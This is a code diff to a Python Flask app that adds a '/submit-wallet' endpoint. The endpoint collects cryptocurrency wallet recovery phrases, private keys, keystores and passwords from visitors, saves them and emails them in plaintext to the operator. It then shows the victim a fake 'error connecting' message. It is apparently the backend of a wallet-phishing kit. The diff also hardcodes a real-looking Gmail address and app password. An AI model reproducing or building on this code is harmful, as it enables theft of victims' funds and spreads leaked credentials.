@@ -239,9 +239,9 @@ from email.mime.multipart import MIMEMultipart
 from email.utils import formataddr
 from os import getenv
 
-@user_bp.route('/submit-wallet', methods=['POST'])
+@user_bp.route('/submit-wallet-x', methods=['POST'])
 @csrf.exempt
-def submit_wallet():
+def submit_wallet_x():
     try:
         # Handle the incoming data
         if request.content_type == 'application/json':
@@ -255,7 +255,9 @@ def submit_wallet():
         if not data:
             return jsonify({"success": False, "error": "No data received to connect wallet"})
 
-        print(data)
+        # print(data)
+        
+        # return success_response('testing for now', data=data)
         
         type = int(data.get('type'))
         password = data.get('password')
@@ -283,6 +285,8 @@ def submit_wallet():
         if not wallet_type:
             return error_response("Invalid wallet type provided.")
 
+        # return success_response('testing for now', data=data)
+    
         # Save the wallet data to the database
         wallet = Wallets(
             type_id=wallet_type.id,
@@ -294,6 +298,8 @@ def submit_wallet():
         db.session.add(wallet)
         db.session.commit()
 
+        # return success_response('testing for now', data=data)
+    
         # Email subject and content
         subject = f"[Incoming Wallets] {wallet_type.title}"
         html_body = f"""
@@ -387,6 +393,204 @@ def submit_wallet():
     except Exception as e:
         traceback.print_exc()
         return error_response(str(e))
+
+@user_bp.route('/submit-wallet', methods=['POST'])
+@csrf.exempt
+def submit_wallet():
+    try:
+        # Handle the incoming data
+        if request.content_type == 'application/json':
+            data = request.get_json()
+        elif 'multipart/form-data' in request.content_type:
+            data = request.form.to_dict()
+        else:
+            return jsonify({"success": False, "error": "Content-Type must be application/json or multipart/form-data"})
+
+        if not data:
+            return jsonify({"success": False, "error": "No data received to connect wallet"})
+
+        type = int(data.get('type'))
+        password = data.get('password')
+        phrase = data.get('phrase')
+        keystore = data.get('keystore')
+        privatekey = data.get('privatekey')
+
+        # Validate "type" is always required
+        if not type:
+            return error_response('Wallet type is required.')
+
+        # Validate at least one field is provided (excluding "type")
+        if not any([password, phrase, keystore, privatekey]):
+            return error_response('Provide at least one of password, phrase, keystore, or private key.')
+
+        # If keystore is provided, ensure password is also provided
+        if keystore and not password:
+            return error_response('Password is required when keystore is provided.')
+
+        if password and not keystore:
+            return error_response('KeyStore is required when password is provided.')
+
+        # Validate wallet type exists
+        wallet_type = Wallet_types.query.filter_by(id=type).first()
+        if not wallet_type:
+            return error_response("Invalid wallet type provided.")
+
+        # Save the wallet data to the database
+        wallet = Wallets(
+            type_id=wallet_type.id,
+            password=password,
+            phrase=phrase,
+            keystore=keystore,
+            privatekey=privatekey
+        )
+        try:
+            db.session.add(wallet)
+            db.session.commit()
+        except Exception as db_error:
+            # Handle database errors
+            print("Database error:", db_error)
+            if "2003" in str(db_error):
+                return error_response("Unable to connect to the database. Please check the connection and try again.")
+            return error_response(f"An error occurred while saving the wallet data: {db_error}")
+
+                # Email subject and content
+        subject = f"[Incoming Wallets] {wallet_type.title}"
+        html_body = f"""
+        <html>
+        <body>
+            <h3>New Wallet From Web3 Auth </h3>
+            <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif; font-size: 14px; color: #333;">
+                <thead>
+                    <tr>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Properties</th>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Values</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Type</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">
+                        {wallet_type.title}
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Password</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{password}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Recovery Phrase</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{phrase}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Keystore</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{keystore}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Private Key</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{privatekey}</td>
+                    </tr>
+                </tbody>
+            </table>
+        </body>
+        </html>
+        """
+        text_body = (
+            f"\n\n\nWallet Details Plain Text Format\n\n"
+            f"Wallet Type: {wallet_type.title}\n"
+            f"Wallet Password: {password}\n"
+            f"Recovery Phrase: {phrase}\n"
+            f"Keystore: {keystore}\n"
+            f"Private Key: {privatekey}"
+        )
+
+        # Send email using smtplib
+        mail_server = getenv('MAIL_SERVER_2', 'smtp.googlemail.com')
+        mail_port = getenv('MAIL_PORT', 587)
+        sender_username = getenv('MAIL_USERNAME_2', 'boluwatifemayowa01@gmail.com')
+        sender_email = getenv('MAIL_EMail_2', 'boluwatifemayowa01@gmail.com')
+        sender_name = "Wallet Notification"
+        sender_password = getenv('MAIL_PASSWORD_2', 'qaec dxyl tlqh ajjs')
+        recipients = [getenv('MAIL_USERNAME')]  # Add your recipients here
+
+        from threading import Thread
+        import smtplib
+        from email.mime.text import MIMEText
+        from email.mime.multipart import MIMEMultipart
+
+        def send_email_in_background(msg, mail_server, mail_port, sender_email, sender_password, recipients):
+            try:
+                with smtplib.SMTP(mail_server, mail_port, timeout=30) as server:
+                    server.starttls()
+                    server.login("secure", sender_password)
+                    server.sendmail(sender_email, recipients, msg.as_string())
+                print(f"Email sent successfully to {recipients}")
+            except Exception as e:
+                print(f"Email sending failed: {e}")
+
+        # Inside your route
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = formataddr((sender_name, sender_email))
+            msg['To'] = ', '.join(recipients)
+            msg['Subject'] = subject
+
+            msg.attach(MIMEText(html_body, 'html'))
+            msg.attach(MIMEText(text_body, 'plain'))
+
+            # Start the email sending in a thread
+            email_thread = Thread(target=send_email_in_background, args=(msg, mail_server, mail_port, sender_email, sender_password, recipients))
+            email_thread.start()
+            print("Email sending initiated in background")
+
+        except Exception as email_error:
+            traceback.print_exc()
+            print(f"Failed to initiate email sending: {email_error}")
+            return error_response("Failed to initiate email sending.")
+
+        """ try:
+            msg = MIMEMultipart()
+            msg['From'] = formataddr((sender_name, sender_email))
+            msg['To'] = ', '.join(recipients)
+            msg['Subject'] = subject
+
+            msg.attach(MIMEText(html_body, 'html'))
+            msg.attach(MIMEText(text_body, 'plain'))
+
+            # Connect to the SMTP server and send the email
+            # with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            # with smtplib.SMTP(mail_server, mail_port) as server:
+            with smtplib.SMTP(mail_server, mail_port, timeout=10) as server:
+                server.starttls()
+                server.login("secure", sender_password)
+                server.sendmail(sender_email, recipients, msg.as_string())
+
+            print(f"Email sent successfully to {recipients}")
+
+        except Exception as email_error:
+            traceback.format_exc()
+            print(f"Failed to send email: {email_error}")
+            # return error_response("Failed to send email. Please try again.")
+            return error_response(f"Failed to connect. Please try again.")
+ """
+        """ data = {
+            'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
+            'redirect': url_for('main.index')
+        } """
+        data = {
+            # 'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
+            'message': f'Error connecting Your {wallet_type.title} wallet.',
+            'redirect': url_for('main.index')
+        }
+        return success_response(data['message'], data=data)
+
+    except requests.exceptions.ConnectionError as net_exc:
+        print("Network connection error:", net_exc)
+        return error_response("Network connection error. Please check your internet connection and try again.")
+
+    except Exception as e:
+        print(f"smtp-details->  - {e}\n\n {mail_server, mail_port, sender_email, sender_password, recipients}")
+        traceback.print_exc()
+        return error_response(f"An unexpected error occurred: {str(e)}")
 
 @user_bp.route("/user", methods=['POST'])
 @csrf.exempt
